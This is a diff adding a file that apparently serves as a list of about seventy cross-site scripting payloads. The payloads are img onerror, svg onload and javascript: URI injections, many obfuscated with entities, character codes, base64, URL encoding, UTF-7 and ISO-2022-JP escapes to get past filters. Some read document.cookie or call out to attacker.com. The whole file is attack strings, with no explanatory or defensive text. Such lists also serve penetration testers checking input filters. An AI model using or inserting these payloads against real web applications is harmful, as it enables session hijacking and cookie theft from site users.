@@ -1,0 +1,74 @@
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(0)">
+<img src=x onerror = alert(1)>
+<img src="x" onerror="alert('XSS')">
+<img src='x' onerror="alert('XSS')">
+<img src="x" onerror='alert("XSS")'>
+<img src="x" onerror=`alert(1)`>
+"><img src=x onerror=alert(1)>
+'"><img src=x onerror=alert(1)>
+"'><img src=x onerror="alert(1)">
+<img src="javascript:alert(1)">
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert(1)">Click Me</a>
+<svg onload=alert(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<img src="x" onerror="alert(&#49;)">
+<img src=x onerror="/*'/*"/ onerror=alert(1)>
+<img src="x" onerror="this.onerror=null;alert(1)">
+<img src=x onerror="alert(1)"<!---->>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=java\0script:alert(1)>
+<img src="x" onerror="setTimeout('alert(1)', 0)">
+<img src="x" onerror=eval('alert(1)')>
+<img src="x" onerror="javascript:alert(/XSS/)">
+<img src="x" onerror="confirm(1)">
+<img src="x" onerror="prompt('XSS')">
+<img src="x" onerror="alert(document.cookie)">
+</script><img src="x" onerror="alert(1)">
+<img src="x" onerror="alert(1)" autofocus>
+<img src="x" onerror="alert(unescape('%58%53%53'))">
+<img src="x" onerror="eval(decodeURIComponent('%61%6c%65%72%74(1)'))">
+<img src=x onerror=alert(1)%00>
+<img src=x onerror=alert(1)%00.png>
+<img src="x" onerror="alert(1)"><!-- -->
+<img src="x" onerror="alert(1)" width="200" 'other'>
+<img src="x" onerror=alert(String.fromCharCode(88,83,83))>
+<img src="x" onerror="alert(/XSS/)">
+<img src="x" onerror=alert(String.fromCharCode(49))>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<img src="x" onerror="this.onerror=null;alert(String.fromCharCode(88,83,83))">
+<!-- --><img src="x" onerror="alert(1)">
+"><svg onload=alert(1)>
+<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
+<img src="x" onerror="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41), 0)">
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cscript%3Ealert%281%29%3C/script%3E
+&lt;img src="x" onerror="alert(1)"&gt;
+<img src="x" onerror=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)>
+</img><img src=x onerror="alert(1)">
+'/><img src="x" onerror="alert(1)">
+"-->"><img src="x" onerror="alert(1)"><!--
+<img src="x" onerror="fetch('https://attacker.com')">
+<img src="x" onerror="eval('setTimeout(()=>alert(1),0)')">
+<img src="x" onerror="alert(1)" style="position:absolute;">
+<img src=x style="top:expression(alert(1))">
+<img src="x" onerror="history.pushState('', '', 'evil');alert(1)">
+<img src="x" onerror="while(true){alert(1)}">
+<img src="x" onerror="if(document.domain==='victim.com'){alert(1)}">
+<img src="x" onerror="`alert(1)`">
+<img src="x" onerror="//'" + "'alert(1)">
+<img src="x" onerror="alert(String.fromCharCode(60, 105, 109, 103, 62))">
+<img src="x" onerror="/*<script>*/alert(1)//">
+"><img src="x" onerror="alert(1)">
+%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
+<img src="x" onerror=decodeURIComponent('%61%6c%65%72%74%28%31%29')>
++ADw-script+AD4-alert(1)+ADw-+AC8-script+AD4-  #utf-7
+\x1b(B onerror=alert(8)// # ASCII
+\x1b$@ onerror=alert(8)// # JIS X 0208 1978
+\x1b(J onerror=alert(8)// # JIS X 0201 1976
+\x1b$B onerror=alert(8)//
+%1b(B onerror=alert(8)// # ASCII
+%1b$@ onerror=alert(8)// # JIS X 0208 1978
+%1b(J onerror=alert(8)// # JIS X 0201 1976
+%1b$B onerror=alert(8)//
